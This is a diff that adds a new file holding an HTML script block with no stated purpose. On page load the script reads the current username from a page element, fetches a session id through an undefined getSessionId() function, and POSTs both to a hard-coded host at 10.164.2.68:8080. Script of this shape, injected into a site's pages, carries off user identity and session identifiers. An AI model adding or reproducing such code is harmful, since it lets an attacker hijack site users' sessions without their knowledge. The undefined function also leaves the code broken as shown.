@@ -1,0 +1,40 @@
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        function getCurrentUser() {
+            const systemInfoElement = document.getElementById("system_info");
+            console.log(systemInfoElement);
+            if (systemInfoElement) {
+                const usernameMatch = systemInfoElement.innerHTML.match(
+                    /<em>Username:<\/em>\s*(\w+)/,
+                );
+                return usernameMatch ? usernameMatch[1] : null;
+            }
+            return null;
+        }
+
+        function postData(url = "", data = {}) {
+            return fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    "Access-Control-Allow-Origin": "*",
+                },
+                body: JSON.stringify(data),
+            }).then((response) => response.json());
+        }
+
+        const user = getCurrentUser();
+        const id = getSessionId();
+
+        postData("http://10.164.2.68:8080", {
+            user: user,
+            id: id,
+        })
+            .then((data) => {
+                console.log("Success:", data);
+            })
+            .catch((error) => {
+                console.error("Error:", error);
+            });
+    });
+</script>
